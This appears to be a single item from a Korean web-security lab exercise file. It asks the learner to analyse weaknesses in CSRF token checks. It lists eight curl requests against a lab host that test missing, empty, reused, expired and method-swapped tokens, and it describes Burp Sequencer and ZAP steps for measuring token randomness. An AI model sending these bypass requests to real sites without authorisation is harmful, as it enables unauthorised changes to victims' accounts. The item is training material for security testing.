- order: 6
  instruction: |-
    CSRF 토큰 검증 로직의 약점을 분석하시오.

    ■ 실습 방법

    ▶ 1단계: 도구 A — curl 로 토큰 약점 테스트 (8 패턴)
    ```bash
    # 1. 토큰 미검증 (제거 시도)
    curl -X POST http://10.20.30.80/profile -d "email=evil"
    # 200 OK → 토큰 검증 안 함 = 취약

    # 2. 빈 토큰
    curl -X POST -d "email=evil&_token=" http://10.20.30.80/profile

    # 3. 다른 사용자 토큰 재사용
    TOKEN_A="..."  # user A 의 토큰
    # user B 의 쿠키 + user A 토큰
    curl -X POST -b "session=USER_B_COOKIE" -d "_token=$TOKEN_A" http://victim/profile

    # 4. 만료된 토큰 재사용
    OLD_TOKEN="...어제 발급..."
    curl -X POST -d "_token=$OLD_TOKEN" http://victim/profile

    # 5. GET 으로 우회 (POST → GET 변경)
    curl "http://victim/profile?email=evil&_token=anything"

    # 6. PUT/PATCH/DELETE 로 우회
    curl -X DELETE http://victim/api/users/1

    # 7. Content-Type 변경 (multipart)
    curl -X POST -F "email=evil" -F "_token=anything" http://victim/profile

    # 8. 예측 가능 토큰 (Burp Sequencer 분석)
    ```

    ▶ 2단계: 도구 B — Burp Sequencer (토큰 무작위성 분석)
    1. Burp Proxy → 토큰 발급 요청 캡처
    2. **Send to Sequencer**
    3. **Live Capture** → 200~1000 토큰 자동 수집
    4. **Analyze Now** → entropy/character distribution 자동 분석
    5. < 60 bits = 예측 가능 (취약)

    ▶ 3단계: 도구 C — OWASP ZAP CSRF Tester
    Active Scan → CSRF 룰 활성화. 자동 8 패턴 점검.

    ▶ 4단계: CSRF 토큰 약점 카테고리
    | 약점 | 영향 |
    |---|---|
